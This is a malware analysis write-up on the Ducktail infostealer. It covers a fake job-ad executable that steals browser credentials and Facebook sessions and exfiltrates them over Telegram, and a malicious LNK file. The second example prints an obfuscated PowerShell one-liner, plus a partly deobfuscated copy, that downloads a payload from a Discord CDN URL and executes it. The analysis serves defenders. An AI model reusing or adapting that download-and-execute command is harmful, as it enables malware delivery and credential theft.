---
tags: Infostealers
---
## Analysing Ducktail Infostealer

Ducktail infostealer targets individuals and employees that may have access to a Facebook Business account.
The malware is designed to steal browser cookies and take advantage of authenticated Facebook sessions to steal information from the victim's Facebook account and ultimately hijack any Facebook Business account that the victim has sufficient access to.
In some cases, the malware is delivered to victims over Linkedin, with the user of fake recruiter accounts.
The binary is designed to use Telegram API to exfiltrate data.

## Example 1 - Binary Masquerading as Job Advertisement
This sample is taken from [Virustotal](https://www.virustotal.com/gui/file/681a9d8a02e7abacc8d5218de80f16e16c02c2b40807246aa7a45e627e35038b)

It's worth mentioning that this sample, and many others, have very minimal hits on VT, usually 0 or 1.

![image](https://github.com/MZHeader/MZHeader.github.io/assets/151963631/d275931e-404f-46bb-b65f-3180e1b9d5f9)

Upon execution, to the user, it appears that a PDF file is opened harmlessly.

![image](https://github.com/MZHeader/MZHeader.github.io/assets/151963631/c036b5c0-3dc0-409a-9374-c5f6b43ec1de)

In the background, a few things are happening.
A browser is silently executed and used to navigate to varius websites to retrieve the victims IP address.

_Evident with the following strings:_

![image](https://github.com/MZHeader/MZHeader.github.io/assets/151963631/081e99c9-deca-4f75-b6cf-509b313ca1bc)


A dll is dropped to the '%AppData%\Temp\.net' directory:

![image](https://github.com/MZHeader/MZHeader.github.io/assets/151963631/e0003384-3133-457a-bd99-c687c745ec8a)

The actually legitimate PDF file is dropped to the Temp directory:

![image](https://github.com/MZHeader/MZHeader.github.io/assets/151963631/73676dae-5cc4-49af-8d9a-8f46f963e529)

A screenshot of the screen at the time of execution is taken and stored in the Temp directory:

![image](https://github.com/MZHeader/MZHeader.github.io/assets/151963631/e885a983-b204-4a0b-b412-8721d0fa9e52)

More interestingly, the following files are collected to be exfiltrated.

_System Information:_

![image](https://github.com/MZHeader/MZHeader.github.io/assets/151963631/49376a22-3737-4254-b8a6-eb1a3aa57fd5)

_Credentials from Browsers:_

![image](https://github.com/MZHeader/MZHeader.github.io/assets/151963631/b3d63fbe-8d70-4324-9852-ca4482c108ed)

This information is again stored in the Temp directory.

Telegram is used as a means of C2 and data exfiltration, this is also evident in the strings, with Telegram URLs and API calls.


![image](https://github.com/MZHeader/MZHeader.github.io/assets/151963631/39be0c4d-3c68-4ce7-b48d-74c71423d613)
![image](https://github.com/MZHeader/MZHeader.github.io/assets/151963631/09f46a31-5290-4181-ae12-bc73331f76af)
![image](https://github.com/MZHeader/MZHeader.github.io/assets/151963631/4dc027fc-d125-4f6e-a1c9-51c63eca739c)

From Telegram bot [atricle](https://telegrambots.github.io/book/Migration-Guide-to-Version-14.x.html)

![image](https://github.com/MZHeader/MZHeader.github.io/assets/151963631/2ca2c814-fcb2-4f13-a624-2c1404a80226)

There are also some interesting references to Facebook URLs within the strings:

![image](https://github.com/MZHeader/MZHeader.github.io/assets/151963631/6728cd25-712c-4b56-a6ff-87993575512c)

![image](https://github.com/MZHeader/MZHeader.github.io/assets/151963631/c5822417-b4c6-4969-b677-433c1c6e5e77)

As well as a list of hardcoded Outlook email addresses

![image](https://github.com/MZHeader/MZHeader.github.io/assets/151963631/edabee64-7f99-46e1-8107-119bde5b61ee)

It's assessed that these email addresses are added to the compromised Facebook Business group.

## Example 2 - LNK File, Calling out to Discord

A much more simpler example, is an lnk file which target path is to download a remote payload from Discord CDN.

![image](https://github.com/MZHeader/MZHeader.github.io/assets/151963631/c5a4f76a-94f8-4ee6-ad76-58483bd027f0)

```
C:\WINDOWS\system32\cmd.exe /c powershe""l""l/""W 0""1 $op='i'+''+'E'+'x';sal donke $op;$hx508wpj=donke(donke($($('(nsd88w-objsd88ct
Systsd88m.Nsd88t.Wsd88bClisd88nt).Doq82mtring(''hu8pvcdn.discordapp[.]com/attachmi47nts/1015258281561821208/1036207817209692210/conmi47thangi47o[.]jpg''.Replace(''u8pv'',''ttps://'').Replace(''i47'', ''e''))').Replace('sd88', 'e').Replace('q82m', 'wnloadS'))));exit9%ProgramFiles(x86)%\Microsoft\Edge\Application\msedge.exe
```

Slightly deobfuscated:
```
/c powershe ll/W 01 ='i'+''+'E'+'x';sal donke ;=donke(donke((new-object System.Net.WebClient).DownloadString('hu8pvcdn.discordapp[.]com/attachmi47nts/1015258281561821208/1036207817209692210/conmi47thangi47o[.]jpg'.Replace('u8pv','ttps://').Replace('i47',
'e'))));exit9%ProgramFiles(x86)%\Microsoft\Edge\Application\msedge.exe
```
We can see that PowerShell is being used to download and execute the remote payload: "hu8pvcdn.discordapp[.]com/attachmi47nts/1015258281561821208/1036207817209692210/conmi47thangi47o[.]jpg"


